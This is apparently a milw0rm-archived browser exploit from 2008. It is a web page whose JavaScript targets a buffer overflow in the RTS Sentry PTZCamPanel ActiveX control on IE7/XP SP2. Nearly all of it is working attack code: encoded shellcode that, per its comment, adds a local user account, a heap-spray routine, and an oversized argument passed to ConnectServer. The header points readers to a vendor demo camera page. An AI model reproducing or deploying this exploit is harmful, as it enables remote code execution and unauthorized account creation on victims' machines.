<!--
RTS Sentry Digital Surveillance PTZCamPanel Class (CamPanel.dll 2.1.0.2)
remote buffer overflow exploit (ie7/xp sp2)


check this camera demo:
http://www.rtssentry.com/index.asp?PageAction=Custom&ID=10




rgod
-
stay tuned with us ...
http://retrogod.altervista.org/join.html
security feeds, radio streams, techno/drum & bass stations to come
-->
<html>
<object classid='clsid:A86934DA-C3D6-4C1C-BD83-CA4F14B362DE' id='PTZCamPanelCtrl' /></object>
<script language="javascript">
//add su one, user: sun pass: tzu
shellcode = unescape("%u03eb%ueb59%ue805%ufff8%uffff%u4949%u3749%u4949" +
                     "%u4949%u4949%u4949%u4949%u4949%u4949%u5a51%u456a" +
                     "%u5058%u4230%u4231%u6b41%u4141%u3255%u4241%u3241" +
                     "%u4142%u4230%u5841%u3850%u4241%u6d75%u6b39%u494c" +
                     "%u5078%u3344%u6530%u7550%u4e50%u716b%u6555%u6c6c" +
                     "%u614b%u676c%u3175%u6568%u5a51%u4e4f%u306b%u564f" +
                     "%u4c78%u414b%u774f%u4450%u4841%u576b%u4c39%u664b" +
                     "%u4c54%u444b%u7841%u466e%u6951%u4f50%u6c69%u6b6c" +
                     "%u6f34%u3330%u6344%u6f37%u6a31%u646a%u474d%u4871" +
                     "%u7842%u4c6b%u6534%u716b%u5144%u6334%u7434%u5835" +
                     "%u6e65%u736b%u646f%u7364%u5831%u756b%u4c36%u644b" +
                     "%u624c%u6c6b%u634b%u656f%u574c%u7871%u4c6b%u774b" +
                     "%u4c6c%u464b%u7861%u4f6b%u7379%u516c%u3334%u6b34" +
                     "%u7073%u4931%u7550%u4e34%u536b%u3470%u4b70%u4f35" +
                     "%u7030%u4478%u4c4c%u414b%u5450%u4c4c%u624b%u6550" +
                     "%u6c4c%u6e6d%u626b%u6548%u6858%u336b%u6c39%u4f4b" +
                     "%u4e70%u5350%u3530%u4350%u6c30%u704b%u3568%u636c" +
                     "%u366f%u4b51%u5146%u7170%u4d46%u5a59%u6c58%u5943" +
                     "%u6350%u364b%u4230%u7848%u686f%u694e%u3170%u3370" +
                     "%u4d58%u6b48%u6e4e%u346a%u464e%u3937%u396f%u7377" +
                     "%u7053%u426d%u6444%u756e%u5235%u3058%u6165%u4630" +
                     "%u654f%u3133%u7030%u706e%u3265%u7554%u7170%u7265" +
                     "%u5353%u7055%u5172%u5030%u4273%u3055%u616e%u4330" +
                     "%u7244%u515a%u5165%u5430%u526f%u5161%u3354%u3574" +
                     "%u7170%u5736%u4756%u7050%u306e%u7465%u4134%u7030" +
                     "%u706c%u316f%u7273%u6241%u614c%u4377%u6242%u524f" +
                     "%u3055%u6770%u3350%u7071%u3064%u516d%u4279%u324e" +
                     "%u7049%u5373%u5244%u4152%u3371%u3044%u536f%u4242" +
                     "%u6153%u5230%u4453%u5035%u756e%u3470%u506f%u6741" +
                     "%u7734%u4734%u4570");
bigblock  = unescape("%u9090%u9090");
headersize = 20;
slackspace = headersize+shellcode.length;
while (bigblock.length<slackspace) bigblock+=bigblock;
fillblock = bigblock.substring(0, slackspace);
block = bigblock.substring(0, bigblock.length-slackspace);
while(block.length+slackspace<0x40000) block = block+block+fillblock;
memory = new Array();
for (i=0;i<50;i++){memory[i] = block+shellcode}
bigblock  = unescape("%u0808%u0808");
while (bigblock.length<slackspace) bigblock+=bigblock;
fillblock = bigblock.substring(0, slackspace);
block = bigblock.substring(0, bigblock.length-slackspace);
while(block.length+slackspace<0x40000) block = block+block+fillblock;
for (i=50;i<100;i++){memory[i] = block+shellcode}
bigblock  = unescape("%u0c0c%u0c0c");
while (bigblock.length<slackspace) bigblock+=bigblock;
fillblock = bigblock.substring(0, slackspace);
block = bigblock.substring(0, bigblock.length-slackspace);
while(block.length+slackspace<0x40000) block = block+block+fillblock;
for (i=100;i<510;i++){memory[i] = block+shellcode}
server="xxxxxxxx";
user="";for (i=0;i<=9999;i++){user=user + unescape("%0d")}
PTZCamPanelCtrl.ConnectServer(server,user);
</script>
</html>

# milw0rm.com [2008-01-16]
